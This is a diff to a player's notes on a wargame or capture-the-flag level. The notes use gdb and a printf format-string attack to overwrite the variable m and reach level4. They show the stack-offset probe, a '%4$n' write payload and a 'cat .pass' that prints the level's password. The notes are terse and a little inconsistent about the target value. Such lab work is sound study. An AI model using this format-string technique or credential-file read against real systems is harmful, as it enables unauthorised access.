@@ -4,9 +4,32 @@
 
 #with gdb we see that the address of m is 0x804988c
 x 0x804988c => m is equal to 0, we must change it
+	\x8c\x98\x04\x08
+
 
 #the problem is the program use fgets and not gets anymore
 the address of char *format, the string where is stocked the imput is 0xbffff520
 
 #nevermind, we can open the shell directly with gdb by changing the value of eax to 0x40
 =>but we are still the user level3, we are not level4! (why?)
+
+# with python -c "print 'A'*525" | ~/level3
+we see that the max number of char returned is 511 A  + '\0'
+
+=> We can't exploit fgets, so let's exploit printf who use directly our string
+
+#https://www.exploit-db.com/papers/23985
+# we see that our string starts with an offset of 4 bytes in our stack
+python -c "print 'A'*4 + ' %4\$x'" | ./level3
+> AAAA 41414141
+
+#we need to modify m with a value of 60
+#we know the address of m
+#the printf of %nb\$p with nb a number told us we are at 4 of the start of the string of printf
+#so if we put \x8c\x98\x04\x08%4$n
+#we write 4 in m
+#so we just need to put 64 in m and it is won
+
+cd /home/user/level4
+cat .pass
+b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
